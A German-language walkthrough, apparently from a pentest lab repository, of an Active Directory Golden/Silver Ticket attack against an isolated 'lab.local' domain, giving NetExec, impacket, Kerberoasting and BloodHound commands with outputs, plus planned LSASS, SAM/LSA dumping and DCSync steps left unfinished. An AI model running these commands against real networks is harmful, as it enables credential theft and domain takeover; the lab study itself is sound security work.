# 06 – Angriffs-Walkthrough (Live-Lab `lab.local`)

Schritt-für-Schritt-Protokoll eines Golden-/Silver-Ticket-Angriffs im **echten Lab**, ausgeführt
von einer Kali-Angreifer-Maschine. Fokus: **ticket-basierter** Weg — Foothold über einen
**lokalen Admin auf einer domänen-gejointen VM**, daraus Schlüsselmaterial für Silver-/Golden-Tickets.

> ⚠️ **Nur autorisiertes Eigen-Lab.** Alle Hosts/Konten unten gehören zur isolierten Testumgebung.
> **Secrets-Hygiene:** Passwörter/Hashes/Tickets werden hier **redigiert** (gekürzt) und liegen im
> Klartext nur lokal in `.gitignore`-geschützten Dateien — nie im Repo (siehe `.gitignore`).

---

## Lab-Fakten (live ermittelt)

| Element | Wert |
|--------|------|
| Domäne (FQDN) | `lab.local` |
| NetBIOS | `LAB` |
| Base DN | `DC=lab,DC=local` |
| **Domänen-SID** | `S-1-5-21-1111111111-2222222222-3333333333` |
| DC | `DC` — `10.10.10.10` — Windows Server 2022 (Build 20348), SMB-Signing erzwungen |
| Domänen-Client | `CLIENT01` — `10.10.10.20` — Windows Server 2022 (gejoint) |
| Angreifer | Kali — im selben L2-Netz `10.10.10.0/24` |
| Start-Konto | `testkerb` (Low-Priv Domänenuser) |

**Privilegierte Struktur (aus BloodHound):**
`AdminALLPerm` ist Mitglied von **Domain Admins** *und* **Enterprise Admins**; darin:
`adm.user0`, `user3`, `user0`. Aktive Admin-Konten: `user0`, `adm.user0`, `Administrator`.

---

## Phase 0 – Angreifer-Setup (Kali)

```bash
# Toolset
sudo apt-get install -y python3-impacket impacket-scripts netexec evil-winrm \
     nmap ldap-utils krb5-user smbclient bloodhound.py hashcat john

# Erreichbarkeit ins Lab-Netz prüfen
ping -c2 10.10.10.10            # DC antwortet
for p in 445 88 389; do (echo > /dev/tcp/10.10.10.10/$p) 2>/dev/null \
    && echo "$p offen"; done      # 445/88/389 offen
```

---

## Phase 1 – Recon (unauthentifiziert)

**DC fingerprinten:**
```bash
nxc smb 10.10.10.10
```
```
SMB  10.10.10.10  445  DC  [*] Windows Server 2022 Build 20348 x64 \
     (name:DC) (domain:lab.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

**LDAP Base DN (anonym):**
```bash
ldapsearch -x -H ldap://10.10.10.10 -s base -b "" namingContexts
```
```
namingContexts: DC=lab,DC=local
```

> RID-Brute über Null-Session ist geblockt (`STATUS_ACCESS_DENIED`), anonymes LDAP liefert keine
> User-Objekte → ohne gültiges Konto kein Fortschritt (korrekt gehärtet).

---

## Phase 2 – Authentifizierte Enumeration (als `testkerb`)

**Cred-Validierung + Passwort-Policy:**
```bash
nxc smb 10.10.10.10 -u testkerb -p '<redacted>' --pass-pol
```
Auffällig (schwache Policy): **Account-Lockout-Threshold `None`**, **Komplexität AUS**, Minimum-Länge 7.

**User + Domänen-SID (SAMR / lookupsid):**
```bash
nxc smb 10.10.10.10 -u testkerb -p '<redacted>' --users
impacket-lookupsid 'testkerb:<redacted>@10.10.10.10'
```
```
Domain SID is: S-1-5-21-1111111111-2222222222-3333333333
Users: Administrator, krbtgt, user0, user1, user3,
       user2, adm.user0, test, testkerb
Computer: DC$, CLIENT01$
Getierte Gruppen: Tier0Admins, Tier0ServiceAccounts, Tier1Admins, AdminALLPerm
```

**Kerberoasting / AS-REP prüfen:**
```bash
impacket-GetUserSPNs 'lab.local/testkerb:<redacted>' -dc-ip 10.10.10.10 -request
impacket-GetNPUsers  'lab.local/testkerb:<redacted>' -dc-ip 10.10.10.10 -request
```
```
GetUserSPNs -> No entries found!   (keine User-SPNs; nur Maschinenkonten haben SPNs)
GetNPUsers  -> No entries found!   (kein DONT_REQ_PREAUTH-Konto)
```

**BloodHound-Collection + Auswertung:**
```bash
bloodhound-python -u testkerb -p '<redacted>' -d lab.local \
     -dc DC.lab.local -ns 10.10.10.10 -c All --zip
```
Ergebnis: **kein** ACL-Pfad (GenericAll/WriteDacl/…) von `testkerb`, **kein** RBCD, **keine**
ausnutzbare Delegation (nur der DC hat Unconstrained — normal). ⇒ Klassische
Credential-Angriffe greifen hier nicht; Foothold muss über **Host-Kompromittierung** kommen.

---

## Phase 3 – Foothold: lokaler Admin auf `CLIENT01` (.20)

> Ausgangslage: `testkerb` ist **lokaler Admin** auf der domänen-gejointen VM `CLIENT01`
> (kein Domänen-Admin!). Das genügt bereits für ein **Silver Ticket** und — falls eine
> privilegierte Session auf der VM liegt — über LSASS auch für den Weg zum **Golden Ticket**.

**Lokalen Admin bestätigen:**
```bash
nxc smb 10.10.10.20 -u testkerb -p '<redacted>'
# -> (Pwn3d!)  == lokaler Admin
```

⏳ *folgt sobald `CLIENT01` erreichbar ist:*
- Maschinenkonto-Hash `CLIENT01$` dumpen (`--sam` / `--lsa`)
- LSASS harvesten (`-M lsassy`) → Kerberos-Tickets / Logon-Creds anderer User

---

## Phase 4 – Silver Ticket (TGS für `cifs/CLIENT01`)  ⏳

> Braucht **nur** den `CLIENT01$`-Hash — **kein** Domänen-Admin. Fälscht ein Service-Ticket
> direkt, umgeht den KDC vollständig.

*(wird mit echten Commands + Outputs gefüllt, sobald Phase 3 den Maschinen-Hash liefert)*

---

## Phase 5 – Golden Ticket (TGT via `krbtgt`)  ⏳

> Braucht den **krbtgt-Hash** → nur via **DCSync als Domänen-Admin**. Erreichbar, wenn in
> Phase 3 auf `CLIENT01` Credentials/TGT eines Domänen-Admins geerntet werden.

*(wird gefüllt, sobald ein DA-Kontext vorliegt)*

---

## Nachweise & Artefakte

Screenshots/Logs (redigiert) → `notes/`. Rohe Hashes/Tickets bleiben lokal und werden durch
`.gitignore` (`*.ccache`, `*.kirbi`, `*.secrets`, `hashes*.txt`, …) vom Repo ferngehalten.
